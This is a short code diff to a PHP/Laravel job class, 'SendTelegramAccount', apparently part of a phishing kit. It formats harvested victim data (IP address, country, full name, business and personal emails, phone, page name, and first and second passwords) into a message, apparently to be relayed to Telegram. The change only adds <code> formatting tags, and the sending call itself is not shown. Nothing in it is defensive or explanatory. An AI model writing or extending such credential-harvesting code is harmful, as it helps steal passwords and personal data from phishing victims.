@@ -28,18 +28,18 @@ class SendTelegramAccount implements ShouldQueue
      */
     public function handle(): void
     {
-        $message = "IP: {$this->account->ip} | {$this->account->country} \n"
-            . "Fullname: {$this->account->fullname} \n"
+        $message = "IP:  <code>{$this->account->ip}</code> | {$this->account->country} \n"
+            . "Fullname: {$this->account->fullname} <code></code>\n"
             . "Business Email:<code>{$this->account->business_email}</code> \n"
-            . "Personal Email: {$this->account->personal_email} \n"
-            . "Phone: {$this->account->phone} \n"
-            . "Page Name: {$this->account->page} \n";
+            . "Personal Email: <code>{$this->account->personal_email}</code> \n"
+            . "Phone:  <code>{$this->account->phone}</code>\n"
+            . "Page Name:  <code>{$this->account->page}</code>\n";
 
         if ($this->num == 1) {
-            $message .= "First Password: {$this->account->first_password} \n";
+            $message .= "First Password: <code>{$this->account->first_password}</code>\n";
         } else {
-            $message .= "First Password: {$this->account->first_password} \n";
-            $message .= "Second Password: {$this->account->second_password} \n";
+            $message .= "First Password:  <code>{$this->account->first_password}</code>\n";
+            $message .= "Second Password:  <code>{$this->account->second_password}</code>\n";
         }
 
 
